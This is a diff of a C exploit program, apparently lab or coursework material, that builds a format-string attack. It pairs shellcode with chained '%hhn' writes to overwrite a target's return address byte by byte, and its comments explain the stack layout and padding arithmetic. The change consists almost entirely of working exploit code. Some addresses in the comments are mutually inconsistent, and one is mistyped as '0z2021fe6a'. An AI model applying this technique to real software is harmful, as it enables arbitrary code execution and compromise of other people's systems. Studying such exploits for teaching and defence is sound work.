@@ -26,7 +26,7 @@ int main(void)
    * 	    % x /x buf
    * 	    	0x2021fa60
    *
-   * 	    Address of shellcode = buf + 56 = 0x2021fa98
+   * 	    Address of shellcode = buf + 56 = 0x20211a98
    *
    * 	    RA: 0x2021fe68, RA+1: 0x2021fe69, RA+2: 0z2021fe6a, RA+3: 0x2021fe6b
    *
@@ -46,11 +46,16 @@ int main(void)
   	strcat(exploit, shellcode);
 
 	// snprintf already used 41 bytes	
+	// Want to write 0x98, 0x1a, 0x21, 0x20
+	//
+	// The difference between current stack pointer (0x20221950)
+	//  and the start address of freeString (0x20221960) is 16
+	//  bytes. Hence, there are two words in between.
 
-	strcat(exploit, "%111d%hhn");
-	strcat(exploit, "%129d%hhn");
-	strcat(exploit, "%9d%hhn");
-	strcat(exploit, "%254d%hhn");
+	strcat(exploit, "%8x%8x%79d%hhn");	// 152-41-16
+	strcat(exploit, "%130d%hhn");	// 26 - 152 + 256 = 130
+	strcat(exploit, "%7d%hhn");	// 33 - 26 = 7
+	strcat(exploit, "%1d%hhn");	// 34 - 33 = 1
 	
 	int len = strlen(exploit);
 	int j;
@@ -59,9 +64,9 @@ int main(void)
 	}
 
   args[1] = exploit;
-  args[2] = NULL;
+  args[2] = NULL;  
 
-  env[0] = &exploit[4];
+    env[0] = &exploit[4];
     env[1] = &exploit[5];
     env[2] = &exploit[6];
     env[3] = &exploit[7];
